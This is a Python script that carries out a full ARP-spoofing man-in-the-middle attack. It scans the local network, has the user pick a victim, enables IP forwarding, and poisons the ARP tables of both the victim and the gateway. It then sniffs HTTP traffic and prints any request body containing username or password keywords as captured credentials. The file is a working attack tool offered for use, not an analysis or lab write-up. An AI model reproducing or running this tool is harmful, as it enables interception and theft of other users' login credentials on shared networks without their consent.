import scapy.all as scapy
from scapy.layers import http
import subprocess
import time
from threading import Thread

# Get the gateway IP and MAC address using `arp -a`
def get_gateway():
    result = subprocess.run(["arp", "-a"], capture_output=True, text=True)
    lines = result.stdout.splitlines()
    for line in lines:
        if "_gateway" in line:
            parts = line.split()
            gateway_ip = parts[1].strip("()")
            gateway_mac = parts[3]
            return gateway_ip, gateway_mac
    return None, None

# Scan the network for connected devices
def scan(ip_range):
    arp_request = scapy.ARP(pdst=ip_range)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=2, verbose=False)[0]

    devices = []
    for element in answered_list:
        device = {"ip": element[1].psrc, "mac": element[1].hwsrc}
        devices.append(device)
    return devices

# Display the scanned devices
def display_devices(devices):
    print("\n[INFO] Devices on the network:")
    print("Index\tIP Address\t\tMAC Address")
    for index, device in enumerate(devices, start=1):
        print(f"{index}\t{device['ip']}\t{device['mac']}")

# Enable port forwarding
def enable_port_forwarding():
    try:
        subprocess.run(["echo 1 > /proc/sys/net/ipv4/ip_forward"], shell=True, check=True)
        print("[INFO] Port forwarding has been enabled.")
    except subprocess.CalledProcessError as e:
        print(f"[ERROR] Failed to enable port forwarding: {e}")
        raise

# Restore original ARP settings
def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, verbose=False, count=4)

# ARP spoofing function
def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

# Get MAC address of a device
def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=2, verbose=False)[0]
    return answered_list[0][1].hwsrc

# ARP spoofer loop
def arp_spoof(victim_ip, router_ip):
    sent_packet_counter = 0
    try:
        while True:
            spoof(victim_ip, router_ip)
            spoof(router_ip, victim_ip)
            sent_packet_counter += 2
            print(f"\r[+] Packets sent: {sent_packet_counter}", end="", flush=True)
            if sent_packet_counter >= 10:
                print("\n[INFO] Starting packet sniffer after 10 packets.")
                break
            time.sleep(2)
    except KeyboardInterrupt:
        restore(victim_ip, router_ip)
        restore(router_ip, victim_ip)
        print("\n[+] Detected CTRL + C, restoring ARP tables.")

# Packet sniffer functions
def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

def get_url(packet):
    host = packet[http.HTTPRequest].Host.decode('utf-8', errors='ignore')
    path = packet[http.HTTPRequest].Path.decode('utf-8', errors='ignore')
    return f"{host}{path}"

def get_login(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load.decode('utf-8', errors='ignore')
        username_terms = [
            "username", "user", "userid", "user_id", "uname", "login", "login_name",
            "user_name", "email", "email_address", "account", "account_name", "handle",
            "profile_name", "alias", "member_id", "customer_id", "user_identifier",
            "user_key", "screen_name", "nickname", "auth_user", "login_user", "password",
            "passwd", "pwd", "pass", "login_password", "user_password", "pin", "passcode",
            "access_code", "secret", "secret_key", "auth_key", "passphrase", "login_key",
            "credentials", "security_code", "auth_password", "member_password",
            "account_password", "login_credentials", "auth_credentials", "user_login",
            "user_auth", "user_access", "account_login"
        ]
        for term in username_terms:
            if term in load:
                return load

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print(f"[+] HTTP Request >> {url}")
        login_info = get_login(packet)
        if login_info:
            print(f"\n[+] Possible username/password combination: {login_info}\n")

# Main function
if __name__ == "__main__":
    # Step 1: Identify the gateway
    gateway_ip, gateway_mac = get_gateway()
    if not gateway_ip:
        print("[ERROR] Unable to identify the gateway.")
        exit(1)
    print(f"[INFO] Gateway identified: {gateway_ip} ({gateway_mac})")

    # Step 2: Scan the network
    print("[INFO] Scanning the network...")
    devices = scan(f"{gateway_ip}/24")
    if not devices:
        print("[ERROR] No devices found on the network.")
        exit(1)
    display_devices(devices)

    # Step 3: Select a target
    target_index = int(input("[INFO] Select a target (index): ")) - 1
    if target_index < 0 or target_index >= len(devices):
        print("[ERROR] Invalid selection.")
        exit(1)

    victim_ip = devices[target_index]["ip"]
    print(f"[INFO] Target selected: {victim_ip}")

    # Step 4: Start ARP spoofing and sniffing
    enable_port_forwarding()
    arp_thread = Thread(target=arp_spoof, args=(victim_ip, gateway_ip))
    arp_thread.start()
    arp_thread.join()

    try:
        sniff("eth0")  # Replace "eth0" with your network interface
    except KeyboardInterrupt:
        restore(victim_ip, gateway_ip)
        restore(gateway_ip, victim_ip)
        print("\n[+] Detected CTRL + C, restoring ARP tables and exiting.")
